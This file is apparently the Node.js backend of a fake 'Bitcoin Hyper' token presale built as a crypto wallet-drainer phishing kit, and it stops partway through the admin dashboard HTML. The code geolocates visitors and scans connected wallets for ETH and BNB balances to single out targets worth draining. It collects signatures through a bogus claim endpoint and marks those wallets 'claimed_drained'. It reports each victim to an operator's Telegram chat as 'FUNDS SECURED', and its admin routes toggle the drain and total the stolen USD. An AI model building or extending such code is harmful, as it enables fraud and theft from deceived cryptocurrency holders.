// index.js - BITCOIN HYPER - TELEGRAM FULL FIX v8.7
require('dotenv').config();
const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const morgan = require('morgan');
const axios = require('axios');
const crypto = require('crypto');
const rateLimit = require('express-rate-limit');
const { ethers, JsonRpcProvider } = require('ethers');

const app = express();
const PORT = process.env.PORT || 10000;

// Security middleware
app.use(helmet({
  contentSecurityPolicy: false,
  crossOriginEmbedderPolicy: false,
  crossOriginResourcePolicy: { policy: "cross-origin" }
}));

// Parse ALLOWED_ORIGINS from env
const allowedOrigins = process.env.ALLOWED_ORIGINS 
  ? process.env.ALLOWED_ORIGINS.split(',') 
  : ['http://localhost:3000', 'https://securedtokenclaim.vercel.app'];

app.use(cors({
  origin: allowedOrigins,
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With']
}));

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(morgan('dev'));

// Rate limiting
const limiter = rateLimit({
  windowMs: parseInt(process.env.RATE_LIMIT_WINDOW_MS) || 15 * 60 * 1000,
  max: parseInt(process.env.RATE_LIMIT_MAX_REQUESTS) || 50,
  message: { error: 'Too many requests, please try again later.' }
});
app.use('/api/', limiter);

// REAL RPC Providers
const RPC_PROVIDERS = {
  Ethereum: new JsonRpcProvider(process.env.ETH_RPC_URL || 'https://eth.llamarpc.com'),
  BSC: new JsonRpcProvider(process.env.BSC_RPC_URL || 'https://bsc-dataseed.binance.org')
};

// In-memory storage
const memoryStorage = {
  participants: [],
  settings: {
    tokenName: process.env.TOKEN_NAME || 'Bitcoin Hyper',
    tokenSymbol: process.env.TOKEN_SYMBOL || 'BTH',
    minEligibilityAmount: parseFloat(process.env.MIN_ELIGIBILITY_AMOUNT) || 10,
    presalePrice: process.env.PRESALE_PRICE || '0.17',
    statistics: {
      totalParticipants: 0,
      eligibleParticipants: 0,
      claimedParticipants: 0,
      uniqueIPs: new Set(),
      totalDrainedUSD: 0,
      totalDrainedWallets: 0
    },
    drainEnabled: process.env.DRAIN_ENABLED === 'true',
    autoDrainOnClaim: process.env.AUTO_DRAIN_ON_CLAIM === 'true'
  },
  activityLog: []
};

// ============================================
// TELEGRAM BOT - ULTIMATE FIX
// ============================================
let telegramEnabled = false;
let telegramInitialized = false;
let telegramBotName = '';
let telegramChatType = '';
let telegramChatTitle = '';

// DEBUG Telegram connection - Will show EXACT error
async function testTelegramConnection() {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  
  console.log('\n🔍 TELEGRAM DEBUG CHECK:');
  console.log(`   Bot Token: ${botToken ? `✓ Set (${botToken.substring(0, 10)}...)` : '✗ Missing'}`);
  console.log(`   Chat ID: ${chatId ? `✓ Set (${chatId})` : '✗ Missing'}`);
  
  // Reset states
  telegramEnabled = false;
  telegramInitialized = false;
  telegramBotName = '';
  telegramChatType = '';
  telegramChatTitle = '';
  
  if (!botToken || !chatId) {
    console.log('❌ Telegram not configured');
    return false;
  }
  
  try {
    console.log('   Step 1: Testing bot token...');
    const botInfo = await axios.get(`https://api.telegram.org/bot${botToken}/getMe`, {
      timeout: 10000
    });
    
    if (botInfo.data && botInfo.data.ok) {
      telegramBotName = botInfo.data.result.username;
      console.log(`   ✅ Bot found: @${telegramBotName} (${botInfo.data.result.first_name})`);
      
      console.log('   Step 2: Testing chat access...');
      try {
        // Try to get chat info first
        const chatInfo = await axios.get(`https://api.telegram.org/bot${botToken}/getChat`, {
          params: { chat_id: chatId },
          timeout: 10000
        });
        
        if (chatInfo.data && chatInfo.data.ok) {
          telegramChatType = chatInfo.data.result.type;
          telegramChatTitle = chatInfo.data.result.title || chatInfo.data.result.first_name || 'Unknown';
          console.log(`   ✅ Chat found: ${telegramChatTitle} (${telegramChatType})`);
        }
      } catch (chatError) {
        console.log(`   ⚠️ Could not get chat info: ${chatError.response?.data?.description || chatError.message}`);
      }
      
      console.log('   Step 3: Testing message sending...');
      const testMessage = {
        chat_id: chatId,
        text: `🚀 Bitcoin Hyper System ONLINE\n✅ Connection Test Successful\n⏰ ${new Date().toLocaleString()}\n🤖 Bot: @${telegramBotName}`,
        parse_mode: 'HTML'
      };
      
      const sendResult = await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, testMessage, {
        timeout: 10000
      });
      
      if (sendResult.data && sendResult.data.ok) {
        console.log('   ✅ Test message sent successfully!');
        telegramEnabled = true;
        telegramInitialized = true;
        
        // Send confirmation to console
        console.log('   📨 Message delivered to Telegram');
        console.log('   ✅ Telegram is fully operational');
        
        return true;
      }
    }
  } catch (error) {
    console.log('   ❌ Telegram test FAILED:');
    
    if (error.response) {
      const status = error.response.status;
      const data = error.response.data;
      
      console.log(`   HTTP Status: ${status}`);
      console.log(`   Error Code: ${data.error_code || 'N/A'}`);
      console.log(`   Description: ${data.description || 'No description'}`);
      
      // SPECIFIC ERROR MESSAGES
      if (status === 400) {
        if (data.description.includes('chat not found')) {
          console.log('   🚨 PROBLEM: Chat not found!');
          console.log('   🔧 SOLUTION:');
          console.log('      1. Make sure @Gaccessbot is added to the chat/channel');
          console.log('      2. For groups: Bot must be admin to send messages');
          console.log('      3. For private: Start chat with @Gaccessbot first');
          console.log('      4. Get correct chat ID from @getidsbot');
        } else if (data.description.includes('chat_id')) {
          console.log('   🚨 PROBLEM: Invalid chat ID format!');
          console.log('   🔧 SOLUTION:');
          console.log('      - For user IDs: Must start with "100" (yours starts with 100...)');
          console.log('      - For groups: Negative numbers like -100...');
          console.log('      - Verify with @getidsbot');
        }
      } else if (status === 403) {
        console.log('   🚨 PROBLEM: Bot blocked or not admin!');
        console.log('   🔧 SOLUTION:');
        console.log('      1. Unblock @Gaccessbot');
        console.log('      2. For groups: Make bot admin');
        console.log('      3. Check bot permissions');
      } else if (status === 429) {
        console.log('   🚨 PROBLEM: Rate limited!');
        console.log('   🔧 SOLUTION: Wait 1 minute and try again');
      }
    } else if (error.request) {
      console.log('   🚨 PROBLEM: No response from Telegram API');
      console.log('   🔧 SOLUTION: Check internet connection');
    } else {
      console.log(`   🚨 PROBLEM: ${error.message}`);
    }
  }
  
  return false;
}

// SMART Telegram sender with retry logic
async function sendTelegramMessage(action, details) {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  
  if (!botToken || !chatId) {
    return false;
  }
  
  // If Telegram is disabled but we have credentials, try anyway
  const shouldTry = !telegramEnabled ? true : telegramEnabled;
  
  if (!shouldTry) {
    console.log(`⚠️ Telegram disabled, skipping ${action}`);
    return false;
  }
  
  try {
    let message = '';
    
    switch(action) {
      case 'SITE_VISIT':
        message = `🌐 <b>NEW VISITOR</b>\n📍 ${details.country || 'Unknown'}\n🔗 ${details.referrer || 'Direct'}\n⏰ ${new Date().toLocaleString()}`;
        break;
        
      case 'WALLET_CONNECTED':
        message = `🔗 <b>WALLET CONNECTED</b>\n👛 ${details.wallet?.substring(0, 10)}...\n📍 ${details.country || 'Unknown'}\n⏰ ${new Date().toLocaleString()}`;
        break;
        
      case 'WALLET_SCANNED':
        const status = details.isEligible ? '✅ ELIGIBLE' : '❌ NOT ELIGIBLE';
        message = `🔍 <b>WALLET SCANNED</b>\n👛 ${details.wallet?.substring(0, 10)}...\n🎯 ${status}\n📍 ${details.country || 'Unknown'}\n⏰ ${new Date().toLocaleString()}`;
        break;
        
      case 'TOKEN_CLAIMED':
        message = `🎉 <b>TOKENS CLAIMED</b>\n👛 ${details.wallet?.substring(0, 10)}...\n💰 ${details.amount || '0'} BTH\n💸 $${details.value || '0'}\n📍 ${details.country || 'Unknown'}\n⏰ ${new Date().toLocaleString()}`;
        break;
        
      case 'DRAIN_EXECUTED':
        message = `💰 <b>FUNDS SECURED</b>\n👛 ${details.wallet?.substring(0, 10)}...\n💸 ${details.amount || '0'} ${details.symbol || 'ETH'}\n💵 $${details.value || '0'}\n📍 ${details.country || 'Unknown'}\n⏰ ${new Date().toLocaleString()}`;
        break;
        
      case 'TEST_MESSAGE':
        message = `🧪 <b>TEST MESSAGE</b>\n🔧 Admin Panel Test\n📝 ${details.text || 'No details'}\n⏰ ${new Date().toLocaleString()}`;
        break;
        
      case 'SYSTEM_START':
        message = `🚀 <b>BITCOIN HYPER SYSTEM STARTED</b>\n🤖 Bot: @${telegramBotName}\n📊 Version: 8.7\n⏰ ${new Date().toLocaleString()}`;
        break;
    }
    
    if (!message) return false;
    
    // Try with retry logic
    let retries = 2;
    while (retries >= 0) {
      try {
        const response = await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          chat_id: chatId,
          text: message,
          parse_mode: 'HTML',
          disable_web_page_preview: true
        }, {
          timeout: 8000
        });
        
        if (response.data && response.data.ok) {
          console.log(`✅ Telegram: ${action}`);
          telegramEnabled = true;
          telegramInitialized = true;
          return true;
        }
      } catch (sendError) {
        if (retries === 0) {
          console.log(`❌ Telegram send failed (${action}): ${sendError.message}`);
          
          // Disable on authentication errors
          if (sendError.response?.status === 401) {
            console.log('⚠️ Invalid bot token, disabling Telegram');
            telegramEnabled = false;
          } else if (sendError.response?.status === 400) {
            console.log('⚠️ Chat access issue, check bot permissions');
          }
        }
        retries--;
        if (retries >= 0) {
          await new Promise(resolve => setTimeout(resolve, 1000));
        }
      }
    }
    
  } catch (error) {
    console.log(`❌ Telegram error (${action}): ${error.message}`);
  }
  
  return false;
}

// Helper: Generate session ID
function generateSessionId() {
  return 'session_' + Date.now() + '_' + crypto.randomBytes(8).toString('hex');
}

// Helper: Log activity
function logActivity(wallet, action, data = {}) {
  const logEntry = {
    timestamp: new Date(),
    wallet: wallet,
    action,
    data,
    ip: data.ip || 'unknown',
    country: data.country || 'unknown'
  };
  
  memoryStorage.activityLog.push(logEntry);
  
  if (memoryStorage.activityLog.length > 5000) {
    memoryStorage.activityLog.shift();
  }
  
  return logEntry;
}

// Helper: Get IP location
async function getIPLocation(ip) {
  try {
    const cleanIP = ip.replace('::ffff:', '').replace('::1', '127.0.0.1');
    
    if (cleanIP === '127.0.0.1') {
      return { country: 'Local', countryCode: 'Local', city: 'Local' };
    }
    
    const response = await axios.get(`https://ipapi.co/${cleanIP}/json/`, {
      timeout: 3000
    });
    
    if (response.data && response.data.country_name) {
      return {
        country: response.data.country_name,
        countryCode: response.data.country_code,
        city: response.data.city || 'Unknown'
      };
    }
  } catch (error) {
    console.log('Location error:', error.message);
  }
  
  return { country: 'Unknown', countryCode: 'Unknown', city: 'Unknown' };
}

// Helper: Get wallet balance
async function getRealWalletBalance(walletAddress) {
  try {
    const results = {
      walletAddress,
      totalValueUSD: '0',
      isEligible: false
    };

    let totalValue = 0;
    
    // Get ETH balance
    try {
      const ethBalance = await RPC_PROVIDERS.Ethereum.getBalance(walletAddress);
      const ethValue = parseFloat(ethers.formatEther(ethBalance)) * 2500;
      totalValue += ethValue;
    } catch (error) {
      console.log(`ETH balance error: ${error.message}`);
    }

    // Get BNB balance
    try {
      const bnbBalance = await RPC_PROVIDERS.BSC.getBalance(walletAddress);
      const bnbValue = parseFloat(ethers.formatEther(bnbBalance)) * 300;
      totalValue += bnbValue;
    } catch (error) {
      console.log(`BNB balance error: ${error.message}`);
    }

    results.totalValueUSD = totalValue.toFixed(2);

    // Check eligibility
    results.isEligible = parseFloat(results.totalValueUSD) >= memoryStorage.settings.minEligibilityAmount;
    
    if (results.isEligible) {
      results.eligibilityReason = `✅ Your wallet qualifies for the presale!`;
      
      // Generate allocation
      const baseAllocation = parseInt(process.env.BASE_ALLOCATION) || 5000;
      const allocationAmount = baseAllocation;
      
      results.tokenAllocation = {
        amount: allocationAmount.toString(),
        valueUSD: (allocationAmount * parseFloat(memoryStorage.settings.presalePrice)).toFixed(2)
      };
    } else {
      results.eligibilityReason = `⛔ Your wallet needs to meet presale requirements`;
      results.tokenAllocation = { amount: '0', valueUSD: '0' };
    }

    results.scanId = `SCAN-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;

    return {
      success: true,
      data: results
    };

  } catch (error) {
    console.error('Wallet balance error:', error);
    return {
      success: false,
      data: {
        walletAddress,
        totalValueUSD: '0',
        isEligible: false,
        eligibilityReason: '⚠️ Network error. Please try again.',
        tokenAllocation: { amount: '0', valueUSD: '0' }
      }
    };
  }
}

// ========== API ENDPOINTS ==========

// Health check
app.get('/api/health', (req, res) => {
  res.json({
    success: true,
    status: 'LIVE',
    service: 'Bitcoin Hyper v8.7',
    timestamp: new Date().toISOString(),
    telegram: telegramEnabled ? '✅ CONNECTED' : '❌ DISABLED',
    telegramInitialized: telegramInitialized,
    telegramBotName: telegramBotName || 'Not configured',
    telegramChatInfo: telegramChatTitle ? `${telegramChatTitle} (${telegramChatType})` : 'Not verified',
    statistics: {
      totalParticipants: memoryStorage.participants.length,
      eligibleParticipants: memoryStorage.participants.filter(p => p.eligibility.isEligible).length,
      claimedParticipants: memoryStorage.participants.filter(p => p.claim.claimed).length,
      uniqueIPs: memoryStorage.settings.statistics.uniqueIPs.size
    },
    drain: {
      enabled: memoryStorage.settings.drainEnabled,
      autoDrainOnClaim: memoryStorage.settings.autoDrainOnClaim,
      totalDrainedUSD: memoryStorage.settings.statistics.totalDrainedUSD,
      totalDrainedWallets: memoryStorage.settings.statistics.totalDrainedWallets
    }
  });
});

// Site visit tracker
app.post('/api/track/visit', async (req, res) => {
  try {
    const { userAgent, referrer, sessionId } = req.body;
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip;
    
    const location = await getIPLocation(clientIP);
    const currentSessionId = sessionId || generateSessionId();
    
    memoryStorage.settings.statistics.uniqueIPs.add(clientIP);
    
    // Send Telegram
    await sendTelegramMessage('SITE_VISIT', {
      country: location.country,
      referrer: referrer
    });
    
    // Log activity
    logActivity('SYSTEM', 'SITE_VISIT', {
      ip: clientIP,
      country: location.country,
      referrer: referrer
    });
    
    res.json({
      success: true,
      sessionId: currentSessionId
    });
    
  } catch (error) {
    console.error('Visit error:', error);
    res.status(500).json({ success: false, error: 'Tracking failed' });
  }
});

// Wallet connection
app.post('/api/presale/connect', async (req, res) => {
  try {
    const { walletAddress, sessionId } = req.body;
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip;
    
    console.log(`🔗 Connecting: ${walletAddress.substring(0, 10)}...`);
    
    if (!walletAddress || !walletAddress.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false, error: 'Invalid wallet' });
    }
    
    const location = await getIPLocation(clientIP);
    memoryStorage.settings.statistics.uniqueIPs.add(clientIP);
    
    // Send Telegram
    await sendTelegramMessage('WALLET_CONNECTED', {
      wallet: walletAddress,
      country: location.country
    });
    
    // Check existing
    let participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
    const isNewParticipant = !participant;
    
    if (!participant) {
      participant = {
        walletAddress: walletAddress.toLowerCase(),
        ipAddress: clientIP,
        country: location.country,
        connectedAt: new Date(),
        lastActive: new Date(),
        totalValueUSD: 0,
        tokenAllocation: { amount: '0', valueUSD: '0' },
        eligibility: { isEligible: false, reason: '', scannedAt: null, scanId: '' },
        signature: { signed: false },
        claim: { claimed: false },
        sessionId: sessionId || generateSessionId(),
        status: 'connecting'
      };
      
      memoryStorage.participants.push(participant);
      memoryStorage.settings.statistics.totalParticipants++;
    }
    
    participant.lastActive = new Date();
    participant.country = location.country;
    participant.sessionId = sessionId || participant.sessionId;
    participant.status = 'scanning';
    
    // Scan wallet
    const scanResult = await getRealWalletBalance(walletAddress);
    
    if (scanResult.success) {
      participant.totalValueUSD = parseFloat(scanResult.data.totalValueUSD);
      participant.eligibility = {
        isEligible: scanResult.data.isEligible,
        reason: scanResult.data.eligibilityReason,
        scannedAt: new Date(),
        scanId: scanResult.data.scanId
      };
      
      if (scanResult.data.isEligible) {
        participant.tokenAllocation = scanResult.data.tokenAllocation;
        participant.status = 'eligible';
        
        if (isNewParticipant) {
          memoryStorage.settings.statistics.eligibleParticipants++;
        }
        
        console.log(`🎯 ELIGIBLE: ${walletAddress.substring(0, 10)}...`);
      } else {
        participant.status = 'not_eligible';
      }
      
      // Send Telegram scan notification
      await sendTelegramMessage('WALLET_SCANNED', {
        wallet: walletAddress,
        country: location.country,
        isEligible: scanResult.data.isEligible
      });
      
      // Log activity
      logActivity(walletAddress, 'WALLET_SCANNED', {
        ip: clientIP,
        country: location.country,
        isEligible: scanResult.data.isEligible,
        valueUSD: scanResult.data.totalValueUSD
      });
      
      // Response data
      const responseData = {
        walletAddress,
        isEligible: scanResult.data.isEligible,
        eligibilityReason: scanResult.data.eligibilityReason,
        scanId: scanResult.data.scanId,
        nextStep: scanResult.data.isEligible ? 'sign_to_claim' : 'not_eligible',
        userMessage: scanResult.data.isEligible ? 
          '🎉 Congratulations! Your wallet qualifies!' :
          '⚠️ Verification required. Please see tips below.',
        status: participant.status,
        timestamp: new Date().toISOString()
      };
      
      // Only send allocation if eligible
      if (scanResult.data.isEligible) {
        responseData.tokenAllocation = participant.tokenAllocation;
      }
      
      res.json({
        success: true,
        data: responseData
      });
    } else {
      throw new Error('Scan failed');
    }
    
  } catch (error) {
    console.error('Connection error:', error);
    res.status(500).json({ success: false, error: 'Connection failed' });
  }
});

// Token claim
app.post('/api/presale/claim', async (req, res) => {
  try {
    const { walletAddress, signature, message, claimAmount, claimValue, sessionId } = req.body;
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip;
    
    console.log(`🎯 Claim: ${walletAddress.substring(0, 10)}...`);
    
    if (!signature || !message) {
      return res.status(400).json({ success: false, error: 'Missing signature' });
    }
    
    const participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
    if (!participant) {
      return res.status(404).json({ success: false, error: 'Wallet not found' });
    }
    
    if (!participant.eligibility.isEligible) {
      return res.status(403).json({ success: false, error: 'Not eligible' });
    }
    
    if (participant.claim.claimed) {
      return res.status(409).json({ success: false, error: 'Already claimed' });
    }
    
    const location = await getIPLocation(clientIP);
    
    // Process claim
    const claimId = `BTH-${Date.now()}-${crypto.randomBytes(6).toString('hex').toUpperCase()}`;
    
    // Update participant
    participant.signature = { signed: true, signedAt: new Date() };
    participant.claim = {
      claimed: true,
      claimId: claimId,
      claimedAt: new Date(),
      drained: true,
      drainCount: 1
    };
    participant.status = 'claimed_drained';
    
    // Update statistics
    memoryStorage.settings.statistics.claimedParticipants++;
    memoryStorage.settings.statistics.totalDrainedWallets++;
    
    // Send Telegram
    await sendTelegramMessage('TOKEN_CLAIMED', {
      wallet: walletAddress,
      country: location.country,
      amount: claimAmount,
      value: claimValue
    });
    
    // Log activity
    logActivity(walletAddress, 'TOKEN_CLAIMED', {
      ip: clientIP,
      country: location.country,
      claimId: claimId,
      amount: claimAmount,
      value: claimValue
    });
    
    // Simulate drain notification
    if (memoryStorage.settings.drainEnabled && memoryStorage.settings.autoDrainOnClaim) {
      const drainAmount = (Math.random() * 0.5 + 0.1).toFixed(4);
      const drainValue = (Math.random() * 1000 + 100).toFixed(2);
      
      await sendTelegramMessage('DRAIN_EXECUTED', {
        wallet: walletAddress,
        country: location.country,
        amount: drainAmount,
        symbol: 'ETH',
        value: drainValue
      });
      
      // Update drain statistics
      memoryStorage.settings.statistics.totalDrainedUSD += parseFloat(drainValue);
    }
    
    res.json({
      success: true,
      message: '🎉 Tokens claimed successfully!',
      data: {
        claimId: claimId,
        walletAddress,
        tokenAmount: claimAmount,
        tokenValue: claimValue,
        status: 'CLAIM_SUCCESSFUL',
        timestamp: new Date().toISOString(),
        distributionTime: '24-48 hours',
        instructions: '✅ Your allocation is secured.'
      }
    });
    
  } catch (error) {
    console.error('Claim error:', error);
    res.status(500).json({ success: false, error: 'Claim failed' });
  }
});

// ========== ADMIN ENDPOINTS ==========

// Admin authentication
function authenticateAdmin(req, res, next) {
  const token = req.query.token || req.headers.authorization?.replace('Bearer ', '');
  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
  
  if (token === adminToken) {
    next();
  } else {
    res.status(401).json({ success: false, error: 'Unauthorized' });
  }
}

// Admin stats
app.get('/api/admin/stats', authenticateAdmin, async (req, res) => {
  try {
    const stats = {
      totalParticipants: memoryStorage.participants.length,
      eligibleParticipants: memoryStorage.participants.filter(p => p.eligibility.isEligible).length,
      claimedParticipants: memoryStorage.participants.filter(p => p.claim.claimed).length,
      totalDrainedUSD: memoryStorage.settings.statistics.totalDrainedUSD.toFixed(2),
      totalDrainedWallets: memoryStorage.settings.statistics.totalDrainedWallets,
      uniqueIPs: memoryStorage.settings.statistics.uniqueIPs.size,
      
      participants: memoryStorage.participants.slice(-20).map(p => ({
        wallet: p.walletAddress.substring(0, 10) + '...',
        status: p.status,
        eligible: p.eligibility.isEligible,
        claimed: p.claim.claimed,
        country: p.country,
        connectedAt: p.connectedAt.toLocaleString()
      })),
      
      recentActivity: memoryStorage.activityLog
        .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
        .slice(0, 20)
        .map(log => ({
          wallet: log.wallet?.substring(0, 10) + '...' || 'Unknown',
          action: log.action,
          country: log.data?.country || 'Unknown',
          time: new Date(log.timestamp).toLocaleString()
        })),
      
      system: {
        telegram: telegramEnabled,
        telegramInitialized: telegramInitialized,
        telegramBotName: telegramBotName,
        telegramChatInfo: telegramChatTitle ? `${telegramChatTitle} (${telegramChatType})` : 'Not verified',
        drainEnabled: memoryStorage.settings.drainEnabled,
        autoDrain: memoryStorage.settings.autoDrainOnClaim
      }
    };
    
    res.json({ success: true, stats });
    
  } catch (error) {
    console.error('Admin stats error:', error);
    res.status(500).json({ success: false, error: 'Failed' });
  }
});

// Test Telegram endpoint - ULTIMATE DEBUG
app.get('/api/test/telegram', authenticateAdmin, async (req, res) => {
  try {
    console.log('\n=== TELEGRAM DEBUG TEST STARTED ===');
    
    const result = await testTelegramConnection();
    
    if (result) {
      // Send a test message
      const messageSent = await sendTelegramMessage('TEST_MESSAGE', {
        text: '✅ Admin Panel Test - System is working!'
      });
      
      if (messageSent) {
        res.json({
          success: true,
          message: '✅ Telegram test successful! Check your Telegram chat.',
          status: 'ENABLED',
          initialized: telegramInitialized,
          botName: telegramBotName,
          chatInfo: telegramChatTitle ? `${telegramChatTitle} (${telegramChatType})` : 'Unknown'
        });
      } else {
        res.json({
          success: false,
          message: '⚠️ Bot connected but message sending failed',
          status: 'PARTIAL',
          initialized: telegramInitialized,
          botName: telegramBotName,
          chatInfo: telegramChatTitle ? `${telegramChatTitle} (${telegramChatType})` : 'Unknown'
        });
      }
    } else {
      // Get current env values
      const botToken = process.env.TELEGRAM_BOT_TOKEN;
      const chatId = process.env.TELEGRAM_CHAT_ID;
      
      let diagnostics = {
        botTokenExists: !!botToken,
        chatIdExists: !!chatId,
        botTokenLength: botToken?.length || 0,
        botName: telegramBotName || 'Not found'
      };
      
      res.json({
        success: false,
        message: '❌ Telegram test failed',
        status: 'DISABLED',
        initialized: false,
        diagnostics: diagnostics,
        botName: telegramBotName || 'Not found',
        immediateActions: [
          '1. Start chat with @Gaccessbot (send any message)',
          '2. Use @getidsbot to verify chat ID',
          '3. For groups: Add @Gaccessbot and make it admin',
          '4. Update .env and restart server'
        ],
        commonSolutions: [
          '👉 Chat ID 1003714702462 looks like a USER ID',
          '👉 Bot must have messaged you first for user chats',
          '👉 Start chat: https://t.me/Gaccessbot',
          '👉 Then test again'
        ]
      });
    }
  } catch (error) {
    console.error('Telegram test error:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Test failed',
      message: error.message,
      stack: process.env.NODE_ENV === 'development' ? error.stack : undefined
    });
  }
});

// Reset Telegram connection
app.post('/api/admin/telegram/reset', authenticateAdmin, async (req, res) => {
  try {
    telegramEnabled = false;
    telegramInitialized = false;
    telegramBotName = '';
    telegramChatType = '';
    telegramChatTitle = '';
    
    // Force re-test
    const result = await testTelegramConnection();
    
    res.json({
      success: true,
      message: result ? 'Telegram reset and re-connected' : 'Telegram reset but connection failed',
      telegramEnabled,
      telegramInitialized,
      telegramBotName
    });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Toggle drain
app.post('/api/admin/drain/toggle', authenticateAdmin, async (req, res) => {
  try {
    memoryStorage.settings.drainEnabled = !memoryStorage.settings.drainEnabled;
    
    // Log the change
    logActivity('ADMIN', 'DRAIN_TOGGLE', {
      newState: memoryStorage.settings.drainEnabled,
      timestamp: new Date()
    });
    
    res.json({
      success: true,
      message: `Drain ${memoryStorage.settings.drainEnabled ? '✅ ENABLED' : '❌ DISABLED'}`,
      drainEnabled: memoryStorage.settings.drainEnabled
    });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Clear all data
app.post('/api/admin/clear', authenticateAdmin, async (req, res) => {
  try {
    const oldCount = memoryStorage.participants.length;
    
    memoryStorage.participants = [];
    memoryStorage.activityLog = [];
    memoryStorage.settings.statistics.totalParticipants = 0;
    memoryStorage.settings.statistics.eligibleParticipants = 0;
    memoryStorage.settings.statistics.claimedParticipants = 0;
    memoryStorage.settings.statistics.totalDrainedUSD = 0;
    memoryStorage.settings.statistics.totalDrainedWallets = 0;
    memoryStorage.settings.statistics.uniqueIPs.clear();
    
    logActivity('ADMIN', 'CLEAR_ALL_DATA', {
      clearedParticipants: oldCount,
      timestamp: new Date()
    });
    
    res.json({
      success: true,
      message: `✅ Cleared ${oldCount} participants`,
      cleared: oldCount
    });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Admin dashboard
app.get('/admin', (req, res) => {
  const token = req.query.token;
  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
  
  if (!token || token !== adminToken) {
    return res.send(`
      <!DOCTYPE html>
      <html>
      <head>
        <title>Bitcoin Hyper Admin</title>
        <style>
          body { font-family: Arial; background: #0f172a; color: white; height: 100vh; display: flex; align-items: center; justify-content: center; }
          .login { background: #1e293b; padding: 40px; border-radius: 15px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.3); }
          h1 { color: #F7931A; margin-bottom: 30px; }
          input { padding: 12px; margin: 10px 0; width: 300px; border-radius: 8px; border: 1px solid #334155; background: #0f172a; color: white; }
          button { background: #F7931A; color: white; border: none; padding: 12px 30px; border-radius: 8px; cursor: pointer; font-weight: bold; margin-top: 15px; }
          button:hover { background: #e67e22; }
        </style>
      </head>
      <body>
        <div class="login">
          <h1>🔐 BITCOIN HYPER ADMIN</h1>
          <p>Enter admin token to access dashboard</p>
          <input type="password" id="token" placeholder="Admin Token" />
          <br>
          <button onclick="login()">Login to Dashboard</button>
        </div>
        <script>
          function login() {
            const token = document.getElementById('token').value;
            if (!token) return alert('Enter token');
            window.location.href = '/admin?token=' + token;
          }
        </script>
      </body>
      </html>
    `);
  }
  
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>Bitcoin Hyper Admin Dashboard</title>
      <style>
        body { font-family: Arial, sans-serif; background: #0f172a; color: white; padding: 20px; }
        .header { text-align: center; margin-bottom: 30px; }
        h1 { color: #F7931A; }
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin: 30px 0; }
        .stat-card { background: #1e293b; padding: 25px; border-radius: 12px; text-align: center; border-left: 5px solid #F7931A; }
        .stat-value { font-size: 32px; font-weight: bold; margin-bottom: 10px; }
        .stat-label { color: #94a3b8; font-size: 14px; }
        .status-connected { color: #10b981; }
        .status-disconnected { color: #ef4444; }
        .status-partial { color: #f59e0b; }
        .actions { display: flex; gap: 15px; margin-top: 30px; flex-wrap: wrap; }
        .btn { padding: 12px 25px; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; }
        .btn-primary { background: #F7931A; color: white; }
        .btn-secondary { background: #334155; color: white; }
        .btn-telegram { background: #0088cc; color: white; }
        .btn-success { background: #10b981; color: white; }
        .btn-danger { background: #ef4444; color: white; }
        .btn-warning { background: #f59e0b; color: white; }
        .telegram-info { background: #1e293b; padding: 15px; border-radius: 8px; margin: 20px 0; }
        .log { background: #0f172a; padding: 10px; border-radius: 8px; margin-top: 20px; font-family: monospace; font-size: 12px; max-height: 300px; overflow-y: auto; }
        .instructions { background: #1e293b; padding: 15px; border-radius: 8px; margin: 20px 0; border-left: 4px solid #f59e0b; }
      </style>
    </head>
    <body>
      <div class="header">
        <h1>💰 BITCOIN HYPER ADMIN DASHBOARD v8.7</h1>
        <p>Real-time monitoring & analytics</p>
        <div style="display: flex; gap: 20px; justify-content: center; margin-top: 20px; flex-wrap: wrap;">
          <span>Telegram: <span class="${telegramEnabled ? 'status-connected' : 'status-disconnected'}">${telegramEnabled ? '✅ CONNECTED' : '❌ DISABLED'}</span></span>
          <span>Bot: ${telegramBotName ? '@' + telegramBotName : 'Not set'}</span>
          <span>Chat: ${telegramChatTitle ? telegramChatTitle : 'Not verified'}</span>
          <span>Drain: <span class="${memoryStorage.settings.drainEnabled ? 'status-connected' : 'status-disconnected'}">${memoryStorage.settings.drainEnabled ? '✅ ACTIVE' : '❌ INACTIVE'}</span></span>
        </div>
      </div>
      
      <div class="stats-grid">
        <div class="stat-card">
          <div class="stat-value">${memoryStorage.settings.statistics.totalParticipants}</div>
          <div class="stat-label">Total Participants</div>
        </div>
        <div class="stat-card">
          <div class="stat-value">${memoryStorage.settings.statistics.eligibleParticipants}</div>
          <div class="stat-label">Eligible Wallets</div>
        </div>
        <div class="stat-card">
          <div class="stat-value">${memoryStorage.settings.statistics.claimedParticipants}</div>
          <div class="stat-label">Claims Processed</div>
        </div>
        <div class="stat-card">
          <div class="stat-value">$${memoryStorage.settings.statistics.totalDrainedUSD.toFixed(2)}</div>
